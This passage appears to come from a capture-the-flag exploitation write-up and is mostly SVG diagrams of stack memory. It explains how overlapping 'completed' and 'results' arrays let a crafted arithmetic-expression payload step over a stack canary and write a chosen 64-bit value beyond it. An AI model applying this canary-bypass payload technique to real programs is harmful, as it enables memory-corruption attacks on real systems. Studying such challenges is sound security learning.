fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="888" y="164" fill="currentcolor" style="font-size:1em">n</text><text text-anchor="middle" x="896" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="896" y="164" fill="currentcolor" style="font-size:1em">g</text><text text-anchor="middle" x="904" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="904" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="904" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="912" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="912" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="912" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="920" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="920" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="920" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="928" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="928" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="928" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="936" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="944" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="952" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="960" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="960" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="960" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="968" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="968" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="968" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="976" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="976" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="976" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="984" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="984" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="984" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="992" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="1e3" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="1008" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="1016" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="1016" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="1016" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="1024" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="1024" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="1024" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="1032" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="1032" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="1032" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="1040" y="132" fill="currentcolor" style="font-size:1em">_</text><text text-anchor="middle" x="1040" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="1040" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="1048" y="132" fill="currentcolor" style="font-size:1em">0</text></g></svg></div><p>The key idea to bypassing the canary is to notice that since the <code>completed</code> and <code>results</code> are placed next to each over, the <code>completed</code> array overflows into the <code>results</code> the same way the latter overflows into the canary.</p><p>The computation for node 0, written at the beginning of the <code>results</code> array, will overlap with the values 16 to 23 of the <code>completed</code> array.</p><p>Therefore, we can craft a payload like the following:</p><pre tabindex=0><code>(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(1)(0+1-1)+(0*0*0+1311768465173141112)
</code></pre><p>Where:</p><ul><li><code>(0+1-1)</code> is the first calculation being made. <code>0+1</code> yields the result <code>0x0000000000000001</code>, putting <code>0x01</code> in <code>completed[16]</code> to avoid overwriting the stack canary in <code>results[16]</code>. The remaining of the <code>completed</code> array is then filled with zeros.</li><li><code>0*0*0</code> is used for skipping the canary and obtaining <code>results[17] = results[16] * 0</code>, thus ensuring the value in <code>results[17]</code> is zero even if we do not know <code>results[16]</code>.</li><li><code>1311768465173141112</code> corresponds to <code>0x1234567812345678</code>, thanks to the preceding <code>results[18] = results[17] + 0x1234567812345678 = 0 + 0x1234567812345678</code>.</li></ul><p>Here is what the stack looks like with the new payload and the overlapping arrays:</p><div class="goat svg-container"><svg xmlns="http://www.w3.org/2000/svg" font-family="Menlo,Lucida Console,monospace" viewBox="0 0 960 729"><g transform="translate(8,16)"><path d="M112 40H280" fill="none" stroke="currentcolor"/><path d="M112 88H280" fill="none" stroke="currentcolor"/><path d="M112 136H280" fill="none" stroke="currentcolor"/><path d="M112 184H280" fill="none" stroke="currentcolor"/><path d="M384 184H608" fill="none" stroke="currentcolor"/><path d="M608 184H832" fill="none" stroke="currentcolor"/><path d="M112 232H280" fill="none" stroke="currentcolor"/><path d="M384 232h56" fill="none" stroke="currentcolor"/><path d="M440 232h56" fill="none" stroke="currentcolor"/><path d="M496 232h56" fill="none" stroke="currentcolor"/><path d="M552 232h56" fill="none" stroke="currentcolor"/><path d="M608 232h56" fill="none" stroke="currentcolor"/><path d="M664 232h56" fill="none" stroke="currentcolor"/><path d="M720 232h56" fill="none" stroke="currentcolor"/><path d="M776 232h56" fill="none" stroke="currentcolor"/><path d="M112 280H280" fill="none" stroke="currentcolor"/><path d="M384 280h56" fill="none" stroke="currentcolor"/><path d="M440 280h56" fill="none" stroke="currentcolor"/><path d="M496 280h56" fill="none" stroke="currentcolor"/><path d="M552 280h56" fill="none" stroke="currentcolor"/><path d="M608 280h56" fill="none" stroke="currentcolor"/><path d="M664 280h56" fill="none" stroke="currentcolor"/><path d="M720 280h56" fill="none" stroke="currentcolor"/><path d="M776 280h56" fill="none" stroke="currentcolor"/><path d="M112 328H280" fill="none" stroke="currentcolor"/><path d="M384 328h56" fill="none" stroke="currentcolor"/><path d="M440 328h56" fill="none" stroke="currentcolor"/><path d="M496 328h56" fill="none" stroke="currentcolor"/><path d="M552 328h56" fill="none" stroke="currentcolor"/><path d="M608 328h56" fill="none" stroke="currentcolor"/><path d="M664 328h56" fill="none" stroke="currentcolor"/><path d="M720 328h56" fill="none" stroke="currentcolor"/><path d="M776 328h56" fill="none" stroke="currentcolor"/><path d="M112 376H280" fill="none" stroke="currentcolor"/><path d="M384 376h56" fill="none" stroke="currentcolor"/><path d="M440 376h56" fill="none" stroke="currentcolor"/><path d="M496 376h56" fill="none" stroke="currentcolor"/><path d="M552 376h56" fill="none" stroke="currentcolor"/><path d="M608 376h56" fill="none" stroke="currentcolor"/><path d="M664 376h56" fill="none" stroke="currentcolor"/><path d="M720 376h56" fill="none" stroke="currentcolor"/><path d="M776 376h56" fill="none" stroke="currentcolor"/><path d="M112 424H280" fill="none" stroke="currentcolor"/><path d="M384 424h56" fill="none" stroke="currentcolor"/><path d="M440 424h56" fill="none" stroke="currentcolor"/><path d="M496 424h56" fill="none" stroke="currentcolor"/><path d="M552 424h56" fill="none" stroke="currentcolor"/><path d="M608 424h56" fill="none" stroke="currentcolor"/><path d="M664 424h56" fill="none" stroke="currentcolor"/><path d="M720 424h56" fill="none" stroke="currentcolor"/><path d="M776 424h56" fill="none" stroke="currentcolor"/><path d="M112 472H280" fill="none" stroke="currentcolor"/><path d="M112 520H280" fill="none" stroke="currentcolor"/><path d="M112 568H280" fill="none" stroke="currentcolor"/><path d="M112 616H280" fill="none" stroke="currentcolor"/><path d="M112 664H280" fill="none" stroke="currentcolor"/><path d="M112 0V432" fill="none" stroke="currentcolor"/><path d="M112 432v16" fill="none" stroke="currentcolor"/><path d="M112 448V704" fill="none" stroke="currentcolor"/><path d="M280 0V432" fill="none" stroke="currentcolor"/><path d="M280 432v16" fill="none" stroke="currentcolor"/><path d="M280 448V704" fill="none" stroke="currentcolor"/><path d="M384 128V416" fill="none" stroke="currentcolor"/><path d="M440 192V416" fill="none" stroke="currentcolor"/><path d="M496 192V416" fill="none" stroke="currentcolor"/><path d="M552 192V416" fill="none" stroke="currentcolor"/><path d="M608 144V416" fill="none" stroke="currentcolor"/><path d="M664 192V416" fill="none" stroke="currentcolor"/><path d="M720 192V416" fill="none" stroke="currentcolor"/><path d="M776 192V416" fill="none" stroke="currentcolor"/><path d="M832 128V416" fill="none" stroke="currentcolor"/><path d="M112 416v8" fill="none" stroke="currentcolor"/><path d="M280 416v8" fill="none" stroke="currentcolor"/><path d="M384 416v8" fill="none" stroke="currentcolor"/><path d="M440 184v8" fill="none" stroke="currentcolor"/><path d="M440 416v8" fill="none" stroke="currentcolor"/><path d="M496 184v8" fill="none" stroke="currentcolor"/><path d="M496 416v8" fill="none" stroke="currentcolor"/><path d="M552 184v8" fill="none" stroke="currentcolor"/><path d="M552 416v8" fill="none" stroke="currentcolor"/><path d="M608 416v8" fill="none" stroke="currentcolor"/><path d="M664 184v8" fill="none" stroke="currentcolor"/><path d="M664 416v8" fill="none" stroke="currentcolor"/><path d="M720 184v8" fill="none" stroke="currentcolor"/><path d="M720 416v8" fill="none" stroke="currentcolor"/><path d="M776 184v8" fill="none" stroke="currentcolor"/><path d="M776 416v8" fill="none" stroke="currentcolor"/><path d="M832 416v8" fill="none" stroke="currentcolor"/><text text-anchor="middle" x="0" y="308" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="0" y="356" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="0" y="404" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="8" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="8" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="8" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="8" y="212" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="8" y="260" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="8" y="308" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="8" y="356" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="8" y="404" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="16" y="84" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="16" y="132" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="16" y="180" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="16" y="212" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="16" y="260" fill="currentcolor" style="font-size:1em">o</text><text text-anchor="middle" x="16" y="308" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="16" y="356" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="16" y="404" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="16" y="516" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="16" y="564" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="16" y="612" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="16" y="660" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="16" y="708" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="24" y="84" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="24" y="132" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="24" y="180" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="24" y="212" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="24" y="260" fill="currentcolor" style="font-size:1em">m</text><text text-anchor="middle" x="24" y="308" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="24" y="324" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="24" y="356" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="24" y="372" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="24" y="404" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="24" y="420" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="24" y="516" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="24" y="564" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="24" y="612" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="24" y="660" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="24" y="708" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="32" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="32" y="212" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="32" y="260" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="32" y="308" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="32" y="324" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="32" y="356" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="32" y="372" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="32" y="404" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="32" y="420" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="32" y="516" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="32" y="564" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="32" y="612" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="32" y="660" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="32" y="708" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="40" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="40" y="212" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="40" y="260" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="40" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="40" y="324" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="40" y="356" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="40" y="372" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="40" y="404" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="40" y="420" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="40" y="516" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="40" y="564" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="40" y="612" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="40" y="660" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="40" y="708" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="48" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="48" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="48" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="48" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="48" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="48" y="308" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="48" y="324" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="48" y="356" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="48" y="372" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="48" y="404" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="48" y="420" fill="currentcolor" style="font-size:1em">u</text><text text-anchor="middle" x="48" y="516" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="48" y="564" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="48" y="612" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="48" y="660" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="48" y="708" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="56" y="84" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="56" y="132" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="56" y="180" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="56" y="212" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="56" y="260" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="56" y="308" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="56" y="324" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="56" y="356" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="56" y="372" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="56" y="404" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="56" y="420" fill="currentcolor" style="font-size:1em">l</text><text text-anchor="middle" x="56" y="516" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="56" y="564" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="56" y="612" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="56" y="660" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="56" y="708" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="64" y="68" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="64" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="64" y="212" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="64" y="260" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="64" y="308" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="64" y="324" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="64" y="356" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="64" y="372" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="64" y="404" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="64" y="420" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="64" y="516" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="64" y="564" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="64" y="612" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="64" y="660" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="64" y="708" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="72" y="68" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="72" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="72" y="132" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="72" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="72" y="212" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="72" y="260" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="72" y="308" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="72" y="324" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="72" y="356" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="72" y="372" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="72" y="404" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="72" y="420" fill="currentcolor" style="font-size:1em">s</text><text text-anchor="middle" x="72" y="516" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="72" y="564" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="72" y="612" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="72" y="660" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="72" y="708" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="80" y="84" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="80" y="132" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="80" y="180" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="80" y="212" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="80" y="260" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="80" y="308" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="324" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="80" y="356" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="80" y="372" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="80" y="404" fill="currentcolor" style="font-size:1em">3</text><text text-anchor="middle" x="80" y="420" fill="currentcolor" style="font-size:1em">[</text><text text-anchor="middle" x="80" y="516" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="564" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="612" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="660" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="80" y="708" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="88" y="68" fill="currentcolor" style="font-size:1em">=</text><text text-anchor="middle" x="88" y="84" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="88" y="132" fill="currentcolor" style="font-size:1em">f</text><text text-anchor="middle" x="88" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="260" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="88" y="308" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="88" y="324" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="88" y="356" fill="currentcolor" style="font-size:1em">4</text><text text-anchor="middle" x="88" y="372" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="88" y="404" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="88" y="420" fill="currentcolor" style="font-size:1em">2</text><text text-anchor="middle" x="88" y="516" fill="currentcolor" style="font-size:1em">5</text><text text-anchor="middle" x="88" y="564" fill="currentcolor" style="font-size:1em">6</text><text text-anchor="middle" x="88" y="612" fill="currentcolor" style="font-size:1em">7</text><text text-anchor="middle" x="88" y="660" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="88" y="708" fill="currentcolor" style="font-size:1em">9</text><text text-anchor="middle" x="96" y="68" fill="currentcolor" style="font-size:1em">></text><text text-anchor="middle" x="96" y="84" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="96" y="132" fill="currentcolor" style="font-size:1em">8</text><text text-anchor="middle" x="96" y="180" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="96" y="212" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="260" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="308" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="324" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="356" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="372" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="404" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="420" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="516" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="564" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="612" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="660" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="96" y="708" fill="currentcolor" style="font-size:1em">]</text><text text-anchor="middle" x="128" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="164" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="452" fill="currentcolor" style="font-size:1em">(</text><text text-anchor="middle" x="128" y="500" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="128" y="548" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="128" y="596" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="128" y="644" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="128" y="692" fill="currentcolor" style="font-size:1em">P</text><text text-anchor="middle" x="136" y="68" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="116" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="164" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="212" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="260" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="308" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="356" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="404" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="452" fill="currentcolor" style="font-size:1em">S</text><text text-anchor="middle" x="136" y="500" fill="currentcolor" style="font-size:1em">x</text><text text-anchor="middle" x="136" y="548" fill="currentcolor" style="font-size:1em">t</text><text text-anchor="middle" x="136" y="596" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="136" y="644" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="136" y="692" fill="currentcolor" style="font-size:1em">r</text><text text-anchor="middle" x="144" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="164" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="356" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="404" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="452" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="144" y="500" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="144" y="548" fill="currentcolor" style="font-size:1em">a</text><text text-anchor="middle" x="144" y="596" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="144" y="644" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="144" y="692" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="152" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="152" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="152" y="212" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="152" y="260" fill="currentcolor" style="font-size:1em">1</text><text text-anchor="middle" x="152" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="152" y="452" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="152" y="548" fill="currentcolor" style="font-size:1em">c</text><text text-anchor="middle" x="152" y="596" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="152" y="644" fill="currentcolor" style="font-size:1em">e</text><text text-anchor="middle" x="152" y="692" fill="currentcolor" style="font-size:1em">v</text><text text-anchor="middle" x="160" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="160" y="116" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="160" y="212" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="160" y="260" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="160" y="308" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="160" y="452" fill="currentcolor" style="font-size:1em">p</text><text text-anchor="middle" x="160" y="548" fill="currentcolor" style="font-size:1em">k</text><text text-anchor="middle" x="160" y="596" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="160" y="644" fill="currentcolor" style="font-size:1em">d</text><text text-anchor="middle" x="160" y="692" fill="currentcolor" style="font-size:1em">i</text><text text-anchor="middle" x="168" y="68" fill="currentcolor" style="font-size:1em">0</text><text text-anchor="middle" x="168" y="116" fill="currentcolor" 